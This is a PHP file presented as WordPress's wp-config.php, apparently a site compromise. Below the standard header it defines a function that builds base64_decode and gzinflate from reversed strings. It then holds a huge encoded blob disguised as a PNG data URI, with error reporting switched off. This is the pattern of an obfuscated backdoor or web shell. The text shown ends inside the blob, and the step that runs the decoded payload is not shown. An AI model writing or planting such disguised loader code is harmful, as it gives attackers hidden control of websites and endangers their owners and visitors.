<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */
error_reporting(0);

$wp_nonce = "";

function pre_term_name($auth_data, $wp_nonce)
{
    $kses_str = str_replace(array('%', '#'), array('/', '+'), $auth_data);
    $filterfunc = strrev('46esab') . "_" . strrev('edoced');
    $filter = $filterfunc($kses_str);
    $preparefunc = strrev('etalfnizg');
    return @$preparefunc($filter);
}

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
$wp_default_logo = '<img src="data:image/png;7X19e9pIsu9XUTTZAdYYi%cELALBOPEZ2%gC2exsnMsjpMYoAUkjyQaPj7%7rV916wXHnuw#5%x5dzY2tFrV3dX13lVtd1lcfvLs#GzszUf%dKezaVF3r3ct4c4jEeul0kPfveTPRV2EoR%O1%6NXvZu1#tSt#96Z%NoRI#occ6Pr3ftul4uul5cCv1bzykaB%RfifqeeQrMxtpd75pLsRP2bez619Vm67pab8fuhsZt6mWjWm3WD%lnqfvoYoKXw5mLCe7OollU1AnMfGPduPb8j1s%FhHAhbde7BKspsCk6a27URjhJXu8CayJKAarq3#IMDrzvWKprDcrjYqhl%Vj6p0HNWc4G1F8ZgmP9tqKIm0eBNFDcLtYu%brVbTqqo9zN%0UW9%SzyuRfbaD9OOfVvYxjNPPWydrvwsW2Wc%7C5vaZ9c39MiMRv64#%F1%Ob#I%y67koPbyeD8fj385GX7jtq0mN3amY2ePxd1fkOnYfUyjWMhYh7Zt7WaT345UbHfZoOaa#tNpGQ7TrrZbTarUWjt5VT#euqc%1SvRpMZ2Fxc1JkwBPR5N%jCZf9I#z2dX843g607#WyodGs3Wo0RY2a4dGu1E22s0Do9poHRwatYZRSuERnkz9F#eaHjWzUQhjpv7Z9Rx%Gx1Wa82q3qXtfNV3I5BPttJkUl9L%%3fzzW%MrNVlUrq81TE9tj%rZh2K#c65bATzQbh7NNVkUnpFAR4Nr6ci53iEKJlIta25BDeKrN%dnk2vxEzIk9rKeYb3yFK7GLT8ciVjxw3shZrMU%GiXRJ4q8Yxq#%8kjUTqTuTuMo4bmQUNQMaMQl8Vctdr0bGnc0mfiTeSiu%Mns7PLmCcUSve7B9bCCjIWuq606cZFimfna3bhYC5HWPD67GMmGZ0ESN5K48AkZEBcE6gZsmzAkwa2CkQAfbHlDHwxbL%366%IWSOSlnU1jQqIFYVGz7sH8YP0qfTW4J43A%I4RgARi8HYjdIOI#I86vhGRBOhJXAlaEwC60ZxgVlsEU8mA%gdaz8b6cDYk9h7Ho2h#czUs0rN0nz9Pp0Q7VukhFPFt6Gn9MwAJrd#59V1%EE4Gv88vBkFRp656Ga2d%nQ2ObuK1oNoNYq4Y%fx9fyKqN%8PEUDPmLvJU2a2yhKCZS68oZjR2KXaGr0T5o9LTLwI3dHVBIH21vXwQKL0zgkSEXQUBk7Zqgu9LGBr7KjaZpLax2J%LKC8dT955xWH2w%uQ5BWKcr5L7ZJOwZ9pLILQJh8ySwITSPG1BdO53K5MqP1FQCIpo2JL2c8E1489I8rsbR2Y7mEd9Mbl6eBwGPx2t%O5oUo9v3EC5XH6%m4ympgpphkNTAr7xSqVaaB%SvVKJB9a3r6SUWkfSZZlaFRtG7gsBrqtlzdyRfIF3NTGRdV43G#HrXqH#6GF3O5pPrarU9JvnVZY7HAsZMW0ystEx7S4sssbw2QVj29qRYSobhxpOziWeR7pjPT8%OR%M580sitkATX3Sb5OOvvybfCMF1nQSVjgWkHUwir%lkHFfre689D0wKqIQVSIUze9sr4pOGG9KE#8OPJ264D#mR37kcxizUlNqXfCxX#QANpVbp0CofsUww1F#txk6X8ifwnDamOEIrtB0BkhuT3zAek7BIRD#fjK7WA3sEMVVvkJY#AuPRQ%AUQSF6mYejYG0Nn3ax5Nrw6QsBWguPP5cOi0az3YZOatWqRE#NaruEyR7J2VbwKVVAJLFZVyff5byt7DvNUi4kaZGEBeWdtEAjSBWettB6pSLPtMzAjtf#h%HtDCqY1GuqlbrT0Ww49r#fjWj#blnXyzN3MyrSOnJM8IZ4Az9ILjuk5fXFvXil76n4YXy6KarNzFbDikFsgvg#3ciAKen13P9zbfZP3fPRxexsI%aJJtq6sb3ae#XBtmhn9dtg7VvOqbuGmtI7rK0v%H#M5p#uzseDE3FC%LAGNLDF9Iu#1L9#0eNNMAe36F%L#w9kY6kk7JWvDy2vAOmv3ULoNCB4LEdbumtaalcRJU#71I%Hn#yP2SBEza0MXJk7yZ#l7iIU1veunPzmO80arCLnvfkN3BKBwvxZjgN3mFI2p1izob2EFQvNE1vNIQBP5jMb39J8QKsTP8%L9N4bWEkvzsgRaxELvZPu48nofDQTztmEYGzZ2tsKk0VlHHJTOU8XBglHA8LRZPp#hw4d%KiAyHl#K3tp9v2rkXeSwCw9bFeE1CJ98%zI7NN0Tk7OQtm3VHqVyPYH#ZzB8UcALPYXg0hcWkwx1IaRK9e7GhlAZJr13w#mo8vBZpR7SCLG9snQ9m4FsbRwzf6SKCT#%SqBIOdJD0wdqC2diPNRrFDAz1mm9G8vz13ve9L22B#ejyPhuMm8qWVyIb9uhRQNUPCDSTj4Pd2PJXZ26dOKc9RNjZoVvZ6HCxaw#IB508Rz86a2TFR%mpw7o6HvjLiztJVIXM4dd6JanNF6NBs5jFX6ni5hfcZLQNOjpIPHlIpmviTqvL7Yp5xHpsnjVbVHDCi0DfVhgWqRnUAUenxET653ddtx7zR2YExagbQgGk0v7h1HdgghHMQ92BRzE%Q5NyN8qNWujUate3yEPrvWW#rDenRhfo6IC8Apz2iEd7kvHSmUeT30WkpGCSPRGO2YBjHYuKXxhadhciSrtKW%dkRIfC4thu7jzdpfWGvSJGGw7vJPE7bafRFMLp1H8jBadbIY6g0I#3rNKL0o7bA%wUTckIEYDz8W9VewaObFL4ND#mB9PSjNi2TB2s5D9fHaaFZfQcGk79PneAlrIJsEWr7QSmowWOpN#DqNr9JqSR61D#lH82u6aYRWl3CaeR0WSWu4Q8BGWMS2mEbXPYYyr0DoRRXa1JYtNsKLowqptxsIx1XXPTgo0Xoc6gQxiZ2vV0iMUGcHXb#4X2kNrZja3wbCNAtkIND2g56#L%xdoeSk4PE6I5OJBG9W2Jpo2t#FY0JWqq5oW4uNJKPoC#1g06GuAv2619V2U5IN6%eWgXn2jmPyfvCetnUBKSbAdadAln%dMP4GWtAwJabSAjwTy%UKmi3W6yiwbIDybsyCIZsCCyAccoZMIqB2rdA7XioqquFdDZIf8Hm62obN5pU0XVsNk0xdIv44ZOaIVzQjJ16ZhWo92BEkHiu4jZkY7wllCmG7Vh36oubvNN#zsZa39nezgI0rJOy1#r4AD%WOj#SIRrt1nA3QMP5G8C0C3DRCsTQLvxTwuU3QXIC6KYLvlhv85DhLGTwYzT24SFhQc6lXikx4X%akfn3vfwc%bSh9ffdDkKPzP4NYquiYbKnQu7TYsTw#snj5R%GKcL3Cule8aFpdvZCiUKLVaDexegIAFlAIIBQ219SpZuN7NI%cP8X8fw0BiFRUWVK06xyxaLU65G3UDfgctTbWQ6PSeqY0LBazq4tkMbwwSFu1JNpHDmaBThtyK4nnDLWbtCpazK7dxIZiJez2#mx7LO9fWJFU5E%3qURTPCSzT04OsgmcQ9K72kyoGyG81j1NmCiZLN#n2Oep7lriKckB9UazwUjHKtRU5%DMQf7hJvoPZ%qcXZISyZVkqXZtQ0oE0RCesEJvwi%k#oEjyVQGpXAndDiKQ2wA1NEfsKtvEjEMHyE2h#NPlzHrnFKXdDu0qfkDtVNP%5h64zcJULJtviUKBdiB4Wj2AOMLdfgqXXArXnEjOQ25JxvfoV2kB%2TwYyckt8Jb87m0NE#dtxOpJf7MIAv2Ibff7VUgjtNEhH61YkIwudgNLmIhuP1ePK0L8#gTpSIgcjMFWCGHwAmhgdZVD#Oxpj68tXsW#HEup9vRpMbdPpWTtfdhrijAXSITbLTEqu2fzadn7uXvz0D8g8AJKMKAEX4YQ9grKAxn0OGLchZW5PRRo0TMTg5P%MA8htpVaAWRnZ#RGmgvjjg77SC8IN4bkA2G%Pe0NbeXFHHyAtIeX#7Lz3smRPSyCOyNmpV6O5qE%4hwk1vCd#lJDxE5rx9cVWczsKZfz7eilBC%CLfpffqHPmkX19pv6I4lIENdPt2r3oZJBlhIzSkpUAdS3%%d3nqPxdyncMiWR2tJqbVaLUUejW5oKKaPhMWdB6t9esxz1UHccGaI9#5BYHTMl7g57#cvFGvYpkkTA%gfNNsjGobghZ70%8UjSdgUyLKsr4dbgLyX6nRD9H4BzUhPsOtksX7gzBEPG40YSpDUJua8XS5NsnHb2DryNEn26vFjK#MeuqUmvPU15YhBHbLbsNzcWkndjswQbaz9EC70kqLYVGw2Fuu30F2GSzioevXVb2j6yTRSGI5vWPXCyA6Yy2#Z5FJfG3CIgLZk5mlSakCqSeNa1JzX75CGGp31vpWwI6hgTBBKSNhUcCUk0bFDlLPkSMpSf6LUjksxwGSpqnWQbNuc0iVlkKuCxSCirU0iJ7f6TfFwjIuKAuD9Ec6Ln0ua4U7VwnndqEEwD29soo359NA2O5gPVwNJlM1kPLXO%BO2gR0UygX9AqHcZQHjV6KuyX8EonuOmubXc2gKSfmOTqybCCy0wmzsRuvhVnA1LJHFb0gMb7ofdFoVrPNeYRZWWt7ZYVRso1KgH#V6sb4eny06OE9pWOgJaXp57AeyfAG#QGMkfxjn6L07s4dbaMzFrXoESWMUuokryg881jthtwljCBBy14bnzUzqYmvmIXsQ#q%h1ewn8rAbGEj66lNyDY6zFjgizYNPZJ9KySbVoCRCM1fh4Hb9J100xT2BaluHpealzQ0Vg7rNCMl9P9FuXyGD0ldZ0MG44N#TTX#s0RTIIrh#XuSvOXwsJauyY4SIBE2RKwedvzYwhjpqFguUzsvmR2AhJyT8aQVmFsvDEKNnUf%1l6p1c5g%tNXbHG2oWzBZ4ygPCSwgEYToelgIjA#JQYUVfrJRLD25KlCPyAW2FB6ugn0YkE4LrQozYlA9UaOG5MjQLZ7TwOqIUuwbnrG2M4bYk8xnIOsYX8df#sh0qaWe6K#8nKlGGKy4r3FNofsrZNkZMmFo7jaAX506GOT7d12s5H4ovANaxAumu2vIXQCyzPJqiRtdb0zCFHGW%pchYy7jbFQMIq5ch0HXqbQlH9iWiTL4KOSOIMsyADQywByrAyBtnELOZnA8DRPRS6a5GzB7WpZmEaT#f9jfLGeXo3A5CR6wmkxmpF4GUvx8qcFm5JG2hlOOlI6VYzBghhO7FscNjYwGOboKAGtpC#N80M4Y7UXz6BvEs9qMHIS0mVF5G7bMTudZiEosKfgB2x5KOFO1CpDe9jL3gk#MstDYsie0leKpI9vx2CWlreIYHd2j%lYPsVbql8KOB2D3CArOi4A#YiTAnHsW2MePTi0IAgWejCd2TdttHy4503loWH%Fjyy9HIc905a2Ll49TA#jTmgjBh5Gi7v%ngywGd5bKulIRNzynvGsbLw%ETYY9a5#%2fAcWR14cn0eddFn12IDYkJ3AMFxE#FW9OomYtgw8qYFBORoMT633uqQwGjd%Pp%FgMivq%mJ#Q6qztrI8Zy3CvWSGmtF4c4AfSGhYCeuEDDt9yE4XaeFYePHhCZRDFPhsOQJpHfCKFcdkiGyYU#KuhjjF27Vgiidy0Sv994NodDm4eDKt9CgqTc#IivrG3Yi5Es9tD4POWWdxAB#h1AtyM#ZD35uJy3g#uw9Ge0Ax8YGcuI#3IasOqZfoaBA3wlWnPVr%oxg4gvvxtLE62c8KgjWosW7x#XHbO4IfW48F5IJDRq9gWcBW27dvZv90HIy8%CTKOtnm0uT#9i0JPb%qn4rxqWziQLvWP%0gZhG3lI0qmcoksAwSYSQb2rSO0#Haj4R8ofv4KHZu%CSyzy6MjOvziRzO7#PpD0RHeNtxBJqPPTJ08bGHXMJyHIjL%SVs80voL4fn%jSZDDfvqJW00%BjHh4ZrDv8o#nH%qfh3nFK9uwxR#amTgolJi5MYsNPAr6x768jjvIeI8Sbxs9s3t0YvKwSKJYuoYBPeqMn1M8QGRrLGNrSWCNcRXGUBV9fzxer0Oxf8Rn0B3VMXcRhkfC3l6PwR8p9xa8Au%QrsRPl8ZL%#XI02SfL1%NVRJ0kS6DfknbsQzj#FOz3e1SniauIJ3O2m9#M4g#TG%ekyJv8YfL0lcSOj0ijQaLhoIJ#10jSUksPNmR8IS1b69z#OCAbsv%emgrvB35k69VgQL2pdA07gAJyZ0Aku6Y4gBJPaezd3ZnYIohU5HVNpTWZA93RD6FYNDlL2rQrSHdYCxs22#EFQJqoScOA0iufr8TkYmqPz%3J0wEBSmnx3hinrC0RHn0gMRZ0snXv7QyOhypPdoEsigWsCIlAOIl4c7jCFFttIj6XzT2AxLgSat8ZzERR%%0wHwABKw7j%KGiwiitmOMqXm9gw9hqRhHAig7rRTkkqFItuX9icYBlDziI0Jq5LwPH#nsXPhT#2#W9hA#rjPCT7l3fsTDt613z7SGMA4YP3Ksh1qPNc0MAQZgq44mofv#oYZdXgszNdwApttwXCglstw#TrLWFkwaiqrWWS93LemLu0ceRivG1cfJ9XTXqq42P9glZ2jIHrqzPfBjNZLKkOQo5qMPnXpDWMxJs9LzvTK#x7yxKigoIYZATb5TZ%EvOhM0MZTZgc37CJxzGD6Hy2fXey25QmJRODG0ER1dkPgiGpSeJN1Ms9km9yNCLfGiaeVS%A5GS1f1FEgt1UN4fE9OC7ZmOhAmrWUsomzbveAFmoz18YmmQLWBkxsadCxOsrXfke0HIXIqQAAvdzbrKNjerDP9qdPlvaL3lyF%mtd7HeLOOrkZDcrOVMCI1GCs1mDNG6o1qPtZz8JPvCKz1l%Y601JKkRwFoaBJ5zWnzV4k9IA0qZ6cn0VKaX5D0IV0MkI7NQ6jV3HglsRbp7PJOqf38dZz59SIvvYAp9ZqHhqtOqdpVKu1Rql7eEjPSjzQgalO0lJgHA38ez8Yb%N5arVKK%e%9sFPvpfKoMdz8WSaBPrwf3gUIlVgnzht7DwxRcu8oiybgP1YDdJIxBpcdRUOf8VyhckyOSp0fOQdNHH#hwM4Z1mJKnfgSPIwOEgg%Wmc2UJ0cpICvacM#b5NcnJChu5sOBh#FMVUMyIWgH44Aq7PTXkQkJz8ughqkd#w9DlILUNO0e2C%A3zBWanjb8c#o4gPw3MPnuO2ak%vA148vAkKjZkEi2q3YK7VOru5YmxL00OHRCY#I2x2MVaYkPzGaXD5ynKB7pl90gGxaLb91E8IeERhGfebFnU%#aroPzVKLx4Yg7tZVPUDmpK7%P4QTI4dotRwN6dlAJS9gHXPRlGqMuox1L6WU#YjM06aZySGtiGZ%Fg8YNfklhmfGjqRopUtqEbCySSJhAfX2ZSldJD2it2n9gz3Vxfk9NJJvnXy88Fe%fe6S9oJa3G%ESQZBd7Qz8rBKVt8oPpTEhV4m0PAhn4OZuaMTG17oTzisW1YohIUaukedWop1YyoX6jEStBFy6wCYpmEauk329AhEQr#QgTAsIeJ3JEL2uqAswe2kCps6r4cXAbS0#wUS3Gq8Roq4BKKxwBIORx9IfIGhyUUDYoiwORYgc#s1ilWDKQwCQO1SLzaevOwr2xaMdTJXP6o1%ygpLZd61SJUMW72owISWzJDP6f0fJnNrnfjR6omSwEsgpTD7HR1hTlPGRUJvZrNNGS55D7KxFu9hTuUu53Kp93ymXE9Mfno#scDojOUc2zKi4n1%FiVtJmL8jfT%ySTZIfN73%V7iKmbacORZF3u#dZmzgfaSvaKnaWMhB0NfwYqqKYMD5tmDchmxspc8Rk7yS#ge9ndRidDsYJnPD8jUGl3aTxlSnijsdeVjWJju5DNCypM9ye4ivOn#cA1VMbNiQmFOVSQM9YP4B0JV0JLEPzjoRBQlQp4V%7AZ0V#ewsQrmQdADKNCyOAZMCXY5llVEOT0ABhHU0lAplIJsMoS1ahOVj7OpJ93lp1gZLN6RshLsaGIU4XZmgyr15PTQFhtKakzT2Lk93Mw%q#sJxbMU1izs7xgjhThSVKWpDbbCyM8JXdJXqeWu1Y5kRo3zBAZJ2mpK5eZG98DN47GZ#kboWHqQFH8SloH4JrYim1r3zpITIB9YYvdUsRIdkqOMCD7YhXNTgSrdysTClLyYFdg9lTAqlhdYiCsEWUn60BKUiwIaUyZwVMjkqkT4nFE18wo5Mk#QjNLYwEyFWQOSHtnbonzV61XlWeZen4kG8RmLy6UxAKYhdqtPYpRsgxoVkFf0Io6DFHWAKc8pBSTSEjHvevlg61bxOnIywGtoFImVzXT5boiM1cx032a4yuTqXMpy0n#e5ay3N1POZZlLLkE5q5M0s4lMP%o33KAvJTpd9A8yo8wJRWnAuVs1rz8lbCc3vFGxBY7kHEcHAquGHHvzIIMR8oYY0FTSYoyPsmpQVKD1JYrqNkmAC40PvETsQlXT02I%dev8pyxd8wniHwM9kylUkXXDiElPk%H%0Rgh2xW%GpV6pWqzJvht%kEIwn141whiu#pGbHypXP%sLDs7zchNrXpwf52MIXl2g87vzQaja4tc9KaDd52mjXOnOpQfFVB%3UfF75zX8YqnXK8elgSFjraW%ABXIKGfQvp7DpW#R8idCzP6m6sUFovrbde59poGd07EcaubYFZmtbavfE6sR90cUjdXnMmIaJdv2A0Hrb7iDQ8AU5yvaX%YJOvHWJivyyXyy4Uk8UJWTdsAhxKOIgm1BDLrteYlhePCCKVV9WyhYzFuq96cFSJSJRw#4qFDNethKz7vbjLb%EiD7eQ8u7NKlY4MRac7ym7YHJbaH7q1a5zf%jd6oj07c0KCOt4JHOsdfeRpEKr#rDwQwfkVDtcC2QBNjrNYKdFPseqG9nEuoHlIG2wo9XoOb1K3bpsZQD1ANUIYi1BN#PDTpHhJ2noEmNABQlD2pMbPp%pGATrkcMzdxXujKRLzqZqxQ80sIzc0DcaHuE9Y8dn4ch1JBCw7x1Oo1%yApsBwg%dRTYB7IzPxEXmFqdZWg%gjENH8EaFFh86eL4nGPCu7SBrzVr5RCVJT94w1ROKSjic3bV2PdF9rGzWhEumG9qOTpWngAM5Gtd1NCbqBIPAHGccY%m0qI7RxThE%duOZt1Ki6IFomo7FbZdMRBRDO0l0rs6Vc77rC9WgrcVSZFxpw6qJkRiAY8QrtjMMuZuyaOFsjxse2C0ezSopEBeP7FEow5CXmBefHyLIrSa2j5GXbPZ7DK1oHerylQCQ4oJReYkKFrBFDTFk0QUF77nIxVVlElcsc5xOXkLnCrEtkDiW%p6DwlWPEkRv3CYfgYXpPGQZF8DsaBrUmbEtGBS7K4SeQAr8Rb7kpNpB8744PRhq5ImSTV2msAUbZrleqzW3zwoe#hQigLihZgJCEIjJWJaLCMC02iKJrYd%rPFUkXjs#AOSAaYIwnHx03AJBbXVpiU6FYwMN#meKyAdpT4ABBfktdhKhMhQYiCqCPgyu0J83tDZP0IvggFiQnJPwaDJ3PdXd93kBHk33I6ughhHlCDI7cFVEAr4VgfyWg#50%Pn1PDWX2%s7BrrfpcU3ETo8ApLqlb9JFsoWI#jUWdM3eTc2aGQLs8hw4xNbwu7cvh2UC9nmgli#3LQnJojDft1VwzNRnxXM0wrEiOt6N99cpj5mYd4EUcVsN#Cvxo3%1DLz0r2EAezUccbwD84Hz4Ec5e%oVny#rSZfJkQQTajkbFQuXAcRiMs#XteGDq##PA64jtbZyrTPZfMGptg4N#PJzMCJKKFouMaF8QUElHnIX5pUYvjIgN5EQBWuoqvwN44dCoV5F515BJeu1mq5QhV44LOnB4P#UnolrExjjglm4CmWignKR4nXrjvBo6zLbLQRlsXY7K9qoE3UUmk%XKVOZvyalslhVLhezYvTHxUZrtoEKxWUL3WTJkYFpz2Fw2AKzl2#iDoJmQHWzIvia%nTyUMTQOgdFzJIx3OR#4GKRgZOiQcwhgTycJG2jocvZBxO4TgcSLlUDNJuDZ7GiUam5CBGEnwagV7dRy1DC7SuaGEWrmajaw6dWEIMqAGDbz5VARweCIKK#rAuFXuUsWFUmsrF6Z8rySU8SNZpW72isFwl5hHqx9sZfqmcws4cdzWNucP8cG903RKttlyJ7yTu7fA#0rcrjTrVXtXQfrleiWFn8xn2l6G%tWMYrD0gOHGiBN4ZxsXU%mKlQW6HDrici2AlEUHmtuR3yakCx7O%Q3AWlvLyYQ4LwSVgbwbGHSCCBKjyUPeUToRIPIslp09zRW5izjWct8QgrWWQZVjbrlCvuKBLPgTHWOMbUbYWkvbxYOOmnJerqiFrEnuzxmYfB#eHJdNZqnHz6e%ddv5xeX4ysarTqZzj794%M%f%#XJcMcjTqn3SxZv7vfvq83nh%8EUbx7d12d%8nZE3NANf7iKEhwmsWCNT%SeFk4xCG3vBQEgLmK4FYC9uRhhPpOXiMLYvGKXS1O56uI3bmzuxpbKUFbJlUuHVMBF2SveLQ8qK1FQvZ04OhhCyb2hvQd1XraYdV7R0mSYv%wm%Tu1#1DmL3b9hU4F2g%fA0wlYlCjjtOUZ#fbtQIiUdFDEIMI1xsLWo9bF810PhA%XpPjKzkH5ABmarLmUbX%6AOXOV0Mrfok4IZ5nFV8AunylGpQfHt2%5aEDWiI%WYsOBrvj9%ZlTLCysmCbheh6rdQRDzMK5Ky%gaGLr64WuBMEvEZRYgkD6x3vkkwKKvXUISqTyS5EuRItwXFqrdW8WXA9WJMNJDirw%AZbI6F5ajZrRPOb9QjAOO18LSopGNivhS7hIGLnPeTTjQUHMmiVkL63fG7JTmJFQifSaPIAaMtWLKMENcEL9USIdbNDOSM7CYl6kKANzmC5fXG64A#sHJuE#SKnkOfLZ8hrC8hIZi3BYYoKdQyRcClrqxIEAFQOBwAkbRZILMYEsAtkyFgyJ2Y03BQvqGySNfSwElMzJ1erlxgqx0dwvNkDX7CkuZe5IuzHcvEU6v7ZG7AW0hJmBhHdrRoahiZcR7LW884ITDY2FdkpgPW5DMgah8kprdm60eVkt3QmMuBUMzYiXvkOF2GldVqsazRJWEj7VcQAX0YK8foiSyc8TvyC%RxCeZrNOjUbdD%cjK6cqpr2tjlRVZk7x0wnUkLswb6WGcVmkAYEsiqx%TlQp91zo5sQf3gn6xdlwCQjIr9PhjwaRpq56GZpixuebutNbnOX7HmrALm60kHeXMA3fcDhjL4vk%TiJvsvfJNB4Jl952z6fTkZjaJgYMtakiTrLLkwRGad0WZ8nyf#XMzhrbnML1HAxLe1hDaP%dngfD69GgxHCqB8yj%f8c%n6gjk5SJecvWHnH2wCnCnSJNTVORdK2YfjZ#8wcUodzMB3wZy5mcTpk7szCx9vDdezKezQQg9ffUxcC#XYy4U8nzTXyCbaT48Hw28opwEuIqsyiAUH#abAZIB9FeoFJT52iBfPu1PDvzkQcX0PopRDVlvRH9P8suPOcVa1QUiXHjHXYtf%i8qS49Rk1kvvXJRWer59GPBJaV3Zjw52xTx9YtRI#TU2ofU8SvnhS3Wps41uMLsi93VOcKo2eUHKH2yx7ey9Em8VPqUFj6hGMNo4EIEoyFbZRnUYl0x9b1qsSwfHLZK3VSFekuZP8ohYZsjqWpIwZkBrbrBxXUGDVqv8whifUyE4PMnGkyOxXFg5WVtxRc8U%H4JdbK0#HTiyT6nB1fFDi4xy%5SGHixFYkYRCu7G2S7%JpRsqhdfhGL#%fLFTWfxtfV6vVN4cT%nz25vATfbCDN60Wpy96wHaWC2NvORUG1eb0E0jyOVKnsny5bi53FKzLGnl5sqBxCUnm1yFzhR6#0yPBER87Fo5K407KBvhdjkSyaMUwMqU7nx9kcF3HWkRctLXR94#t0nuh3CSz6It#DmXXJjMG#Ujn%g0#IaS8v9Yk7#cm%gMFb4LeXmHFOKqpGVydl5Ql0MpAYPk8jKZx0DRKR7b%yYslMBUyb6oDz#ZCy1VPpvnwqvrgSRGASuVJ8uJx%ooylYJKssdjmqZK6vmKCsGkONDBbVJ6%soR2qQ2rox5SJban1jejSjqNu38n3qJFx39uSupXGJZsE8NFb3Dl40AjwQ2YREVrZO5F1w%wHWtilF4ATAhkQwPLkFtzCxMyR0DgT7q1pFaTJq7xENiNUzRGpP07X3uBhv5m8Rwg3R0o3EykZfXJFt%e88Ck175IGYrfzpb3Ks7GvYBwENE%GqACtKRnpWnx2y#y9wD8D#LMdfjKmvNZr9zjZAmhKKsza6nxdpsZ9#YBhZDtMJl6ibsh56UpI58IKvAzWpPJlXSVJpcSMCKuaNysq5IlCNfcxH2PjqwYyzO8gp7w63TYa5SO4uooqe%43yuE05pgbsiIKlraYVEJMvRkfWnqmH40JMeoSTH81UeGIN9R95dNMP#35VJSh4Y1Xy8pGEc8P#RvXl5NJDgPV%OjRMnK%3g49WdwE10l0WV3ondRPoo%VoKDfeE5TIyi3wK8w7nrF6scUjM5IQApze#VMdH8vYGzLnD5UZLWTcDe0W#cBMKtuD5XI7z4cankBMogZLmAln3XAyFGEtDYp5UAHkk6kIwGHv2UTJXSZBOLvESXhjnXqoESJ44tDunuZ79S8ivJYlzmdTaO2VvWGTJouBRuebAUwmy%GbgJS8WZRlP4OGWIQCUxZDcdMQtfycV1mzTxtRbuHCuir0w8O7fSsdJ6hQNrrkOyxiUkEk%t1bL6eXtcpsKEtI2usa5teHFdDg#H4fSisE6pEoEs%8CJueYcVK4wy5CUv3GHC4PNreOJVNG8H8ELAsqnfEL5Gjo#zF43FLlQUDRSwMoKZKU1yV5VbgYKR2gLN1IKUn4kgGfdTR4#CvvqtWTAVJsicSNrAtsNHgYODlADpyD6ySDShqRbI2zHYzTBTLH81ikjwkWlcmLAlKTNpCQkV7EdJAPN1YPqlXO0k3TufjMXuVTpdWQf1ryrFXNW2ULA13XMgvV%EVKXGWj1FXgsCYd5aTWsMc8pe4aSc6rTJx5cVBArp4cRqmfqrWGdA9VpYzMpOfiQaZ3qQJ0xmhegqiy9aqG6DsYzQzdGz7s5CQfEi%yxgmcYHDRBKae5FMnZ#ZJOh2ohRD4zPUl7%RCduYZyKLIjo53QPtlBUEeufOpgIs8QXkorRxiQogfxPDkAm1tLdi75G28sm5EcrKaVhF6qnYQ%p4h35Lik28SXCeXY8RJLrQqMKwnIqSKM09COAlDkP3ZVZo4D3pKkXp7n2VUM4UO15wvTcLwjJSDId9ikJxCE#6d7U5GF#PZaD44gSqUwnghy9q43PKIQ2Wq3AlHoD3eM3zKfOHaggkDFCHCw9gPOjV1igixV6sjDYv%dSX1y5tIqDcnl7MO5HMIVoMy9MWq0dCSQy9wt9KEPDnOusdsIddDdWMDT09VdLQQGECkhbdnw%F4nCw1kwyEvbSB5diPR5Nnrv16PV#7lomrAT6HZzTAufL33smqhpzGKUCDeIVe8XOSaFiC3mAdg1JD7Xgpa4K4P%MRm0FOD0Lw0pcZinzITLSWqC2VhZqlO8ibUVQ3g4WdsjB8sPZbx0xOzeiJwjSfO#7ZGRy#arRNPqNsS#4zEHr4myZxh0tvEE%IzoeTXYUDKw81saG0pemx5#HCj2N%o%ZenfmykNT44LUgfbtQVmNfyxS1LC#qoJhY6gB1oZGM3MtA#S2iZtXMjVFpLLehBwHFHijkViFhBGYS1F0QazouE2hWwaKsoTQckXioWJ5ZYByeeUFB3WXD5eexFG4qI4aoNKuB5FrLQAxVMcw00X6F3g#JLhx%STJ2zUKvV2C#P1ruFRYygtoNrrN#mj%G%lyrnSt6JZThTLZeZJORxNZSpvygOJRPKZ7PB2NETPh0me#HgwbpKGNPYu8plpTiKnDYSqIITkU#Y0gaWjVDJQuyXiFl0JM1rHw9kLwvI8n7yeMCwKTOUOShLgRylNxEpD0xhrMMKg7uy#RinJ6kOXYFWN0Oez1J1l8BAbMFq#awkObRuXwzUyNNOZVxHxpXYYwPVVSKVFIRdWF9B1mFHZ5ZzkCGaCKhkclkV60azoC8maDAWa#yZJipLJ#bLcW7o1LTVcW9CsFnRcRZAqg8PwIhSdphVwOYY5mo7j5Q1JVQERCZlE5fq#J45YjbWXqhq6w#sVSY4VT1zfeldJ4LICo#TMiwBMR100RuJjBGlKzeTOqe0JxDk1Q3KX3w%UZVeZ1Vq5FyosSRjGq236gQKFHXkod6wmZ8hKApodFuMpsdJzyWEpW0RDKKOma3IGG2hJYkmmxRSK0DPqySCfgZzYgcwSgWkxsidxREzVmPkp3zwVzFiTNUMXjWOsEQp2y7e2z3BBlpfp7tbzaW5yQCqaBZNEVqDFA6bRb85fIZSZSkDwM5qgab2u2No1C1USaAnIyUSYoXuQ5aLeJa3tnQLAQ#x#ML2uhyOPv9amQWNnzMGLsB3zHcOFKRbI4lV2Mrf2dYErfl064s1mslc#RIQF3k#EldMpZWwstSejtJO2W5zCXvWSoC28TtPUzIYnyklvN4QTJecj#nVGONpsJfEuFOYsxpEb5Mo%336#KvZdpfVhrPdSeqbk9dAtHkObByc9fiB8ZRVuM#ifzIMnhXLm6p#qo4#RMyYNRINpFcoKxFjc1%vrhL3oPBxfDMOpx7z0YXZ2KSr#w799LlQFIB1xSkRpZ0c7mGc7fdlF%P77%Jk2zk67rT#RlHYOkRYkX0y#xHwYQaUXkCOkK8Fk9VpfB208uHaOvN9ttq%W2SWn%wk##l9HaibJBqpbZUgxwhyMv%I59G3qaMkAW5XR%e5#4slZMw6u12mwwPXFRokN41DvABF7Rno0yD0PVmp1gKKer8QPm6gbfNWrOSqxP4y#88nYsfp5OLJ1ZrB%Qvt9ariStLeXD9GTFT64WJ%IcFDDSR39RE1CVJDJOaqfVRc5daegvzh9HsS#G28LWk%fqrttcYbB1qLmkP3H%jNPcfaK9MreDUFkbTMd7ahvXWWNiOs1i060a9YTu1umEt3hbwOhe1a3LYhPrmsjSbxPhtuJ67nhsXeKjXoYg0U0tbi6Wu%EITI0#viOdlbfhpcj6#ms3pV1lT9TuOsH0uF0hX9JevTkazT5PL2WRwOT0dTcpa9S97T6fnc%LOzk5JjKK3TNb5qzdOx#fn48%n4#EAt#6XNRz%%